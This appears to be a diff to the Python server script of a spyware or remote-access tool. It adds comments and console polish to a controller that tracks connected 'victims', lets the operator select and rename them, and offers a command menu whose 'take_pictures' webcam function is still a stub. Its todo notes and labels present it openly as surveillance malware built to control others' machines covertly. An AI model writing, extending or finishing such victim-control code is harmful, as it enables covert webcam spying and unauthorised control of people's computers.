@@ -14,24 +14,37 @@ DATA_PORT = 44444
 
 # Todo: Change variable names to more relevant names
 # Todo: Properly comment code
-# Todo: Add a bulletproof file downloader
-# Todo: Erase some scripts and bring them back to Spyware_Server.py
-# Todo: Minimize imports, just what we need nothing else
-# Todo: Add webcam_snap
+
+# Todo: Add webcam snap
+# Todo: Fix user selection
+# Todo: CLEAN CODE
 
 
 class ChooseToAttack(object):
+    # selected_user, users_online[x] => [IP, PORT, CMD_CONN, DATA_CONN] * reference
 
     def __init__(self):
-        self.selected_user = {}
-        self.users_online = {}
+        self.selected_user = {}  # Dict with data of selected victim.
+        self.users_online = {}  # A dict containing lists, each list contain user specific data.
         self.online_size = len(self.users_online.keys())
-        self.buffer = 1024
+        # We use this to check if the length of users_online has changed when the script is running.
+        # With online_size being the old/current size and comparing it with len(users_online) we see
+        # if any new connections have been made.
 
-        self.switch = True  # How the change of the boolean value affect the script
-        self.refresh_screen = True
+        self.buffer = 1024
+        # The max size of each TCP packet we are sending, this value is the same on the client script.
+
+        self.switch = True
+        # We use this as a switch to shut down parts of the script so we can forwards and backwards.
+        self.refresh_sc = True
+        # If new data/errors come to us we refresh our screen and reprint our updated data structures.
+        self.printing_done = bool
+        self.printing_anim = True
+        # Boolean variables related to our console screen printing.
         self.input_thread = True
+        # TO ADD FOR INPUT THREAD
         self.database = ManageDB()
+        # class object that we use to manage our database.
 
     def get_connections(self):
         # Thread running here forever.
@@ -78,13 +91,26 @@ class ChooseToAttack(object):
 
     def pick_victim(self):
         while self.switch:
-
             if len(self.users_online.keys()) > self.online_size or self.refresh_sc:
                 self.refresh_sc = False
                 self.online_size = len(self.users_online.keys())
-
                 clear_screen()
-                print(ascii_logo)
+
+                if self.printing_anim:
+
+                    for line in ascii_logo:
+                        if '\n' in line:
+                            time.sleep(0.1)
+                            print(line, end='')
+                        else:
+                            print(line, end='')
+
+                    self.printing_anim = False
+                    # print('\n')
+                else:
+                    print(ascii_logo, end='')
+                    # print('\n')
+                print('\n')
                 rename_desc = " - Type 'rename' to rename a victim!"
                 select_desc = " - Type the name of the victim you want to select!"
 
@@ -92,41 +118,53 @@ class ChooseToAttack(object):
                 print(beautify(select_desc, '=', 'bottom'), end='\n\n')
 
                 for victim in self.users_online:
-                    print(f" + {victim} + connected on \"{self.users_online[victim][0]}\"")
+                    print(f" [+] {victim} [+] connected on \"{self.users_online[victim][0]}\"")
+
+                self.printing_done = True
 
             elif self.input_thread:
                 self.input_thread = False
                 inp_thread = threading.Thread(target=self.get_input)
                 inp_thread.start()
 
+            else:
+                continue
+
     def get_input(self):
         while self.switch:
 
-            user_input = input('\n >>> ')
+            if self.printing_done:
+                user_input = input('\n >>> ')
+                self.printing_done = False
 
-            if user_input in self.users_online.keys():
-                self.selected_user[user_input] = self.users_online[user_input]
-                self.switch = False
+                if user_input in self.users_online.keys():
+                    self.selected_user[user_input] = self.users_online[user_input]
+                    self.switch = False
 
-            elif user_input.lower() == 'rename':
-                name = input("\n Type the name of the victim you wish to rename > ")
+                elif user_input.lower() == 'rename':
+                    name = input("\n Type the name of the victim you wish to rename > ")
 
-                if name in self.users_online.keys():
-                    new_name = input(f"\n Type a new name for {name} > ")
+                    if name in self.users_online.keys():
+                        new_name = input(f"\n Type a new name for {name} > ")
 
-                    if new_name and new_name != name:
-                        self.database.update(new_name, name)
-                        self.users_online[new_name] = self.users_online[name]
-                        del self.users_online[name]
+                        if new_name and new_name != name:
+                            self.database.update(new_name, name)
+                            self.users_online[new_name] = self.users_online[name]
+                            del self.users_online[name]
+                        else:
+                            print(f'\n ERROR: username [{name}] already exists!')
+                            input(' Press ENTER to continue > ')
+
+                        self.refresh_sc = True
                     else:
-                        invalid_inp()
+                        print(f'\n ERROR: user [{name}] does not exist!')
+                        input(' Press ENTER to continue > ')
+                        self.refresh_sc = True
+                else:
+                    if user_input != '':
+                        print(f"\n Error: No user/command found named [{user_input}]")
 
                     self.refresh_sc = True
-                else:
-                    invalid_inp()
-            else:
-                self.refresh_sc = True
-                time.sleep(0.5)
 
 
 class ExecuteCMD(object):
@@ -135,7 +173,7 @@ class ExecuteCMD(object):
         self.victim_data = victim_data
         self.switch = True
         self.input_thread = True
-        self.refresh_screen = True
+        self.refresh_sc = True
 
         self.run_cmd = {
             'take_pictures': ['Take (x) pictures every (y) seconds', self.take_pictures],
@@ -144,8 +182,8 @@ class ExecuteCMD(object):
     def pick_command(self):
         while self.switch:
 
-            if self.refresh_screen:
-                self.refresh_screen = False
+            if self.refresh_sc:
+                self.refresh_sc = False
                 clear_screen()
 
                 for cmd in self.run_cmd:
@@ -167,7 +205,7 @@ class ExecuteCMD(object):
                     self.switch = False
 
             self.clear_sc = True
-            time.sleep(0.5)
+            time.sleep(1)
 
     def take_pictures(self):
         pass
@@ -205,8 +243,6 @@ class ManageDB(object):
             pass
 
 
-
-
 if __name__ == '__main__':
 
     cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -229,4 +265,3 @@ if __name__ == '__main__':
 
         execute = ExecuteCMD(to_attack.selected_user)
         execute.pick_command()
-
